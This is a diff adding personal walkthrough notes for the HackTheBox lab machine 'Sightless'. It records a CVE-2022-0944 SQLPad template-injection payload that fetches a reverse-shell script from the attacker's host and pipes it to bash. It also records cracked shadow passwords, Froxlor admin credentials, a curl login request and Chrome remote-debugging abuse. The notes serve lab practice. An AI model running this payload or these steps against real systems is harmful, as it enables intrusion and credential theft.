@@ -1,0 +1,62 @@
+Sighless
+
+Port 21 FTP
+Port 22 SSH
+Port 80 HTTP
+
+-> sightless.htb
+-> sqlpad.sightless.htb
+
+sqlpad.sightless.htb:
+	-> users: admin@sightless.htb, john@sightless.htb
+	-> we are already admin on the site
+	-> CVE-2022-0944
+	-> {{ process.mainModule.require('child_process').exec('wget -qO- http://10.10.14.93:8080/reverseshell.sh | bash') }} :: reverse shell by making a reverseshell file and wget it from my machine and execute
+	-> Inside the docker container of sqlpad there is a user -> michael
+	-> From shadow file in docker ( root:blindside ; michael:insaneclownposse ) netstat -tuln
+	-> Got access with SSH
+	-> Root :: [ You can write SUID file: /usr/bin/bash, A lot of ports, --remote-debugging-port ]
+
+
+Root starting...
+	-> Staring to port forward. Current port 3000(SQLPAD)
+	-> Port forward 8080(foxlar) -> Domain not configured on local
+	Port 8080:
+		-> I need a VPN on the host
+		
+	-> Read a bit of the discussion forum for sightless on HTB and found chrome debug
+	-> Starting to port forward and establish any debugging possible 
+	-> Chrome --remote-debugging-port=0 random port chrome dev tools [ 55143, 40959,39655  			changes with session ]
+	-> Froxlar username password: admin, ForlorfroxAdmin
+
+---------------------------Request to foxlor:--------------------------------------------
+curl 'http://admin.sightless.htb:8080/index.php' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'Cache-Control: max-age=0' \
+  -H 'Connection: keep-alive' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'Cookie: PHPSESSID=fc4jcr8rkvi7ht78i4pudge00f' \
+  -H 'Origin: http://admin.sightless.htb:8080' \
+  -H 'Referer: http://admin.sightless.htb:8080/index.php' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.6422.60 Safari/537.36' \
+  --data-raw 'loginname=admin&password=ForlorfroxAdmin&dologin=' \
+  --insecure
+-----------------------------end curl-------------------------------------------------
+
+
+	-> Changed for user web1 FTP for web1 ID, Password: web1, cRjyxpgEof
+	-> Time's up. We lost. We'll get 'em next time
+
+	-> Post time up, had to see up a direct hint for root
+	-> Being distracted by this command and went for FTP. My bad. Comment: "For root, try to find the weird 		port you find during the inital scan" I interpretted it as port 21
+	-> Got root.txt from php-fcm: ae29a2a3990e08a30a6fa82427d4c60a
+	
+
+	-> Finding another way for FTP: web1,uyvkqdAwxF(session based temporary)
+	-> Found Database.kdb stuck here and leaving...
+
+
+
+
+
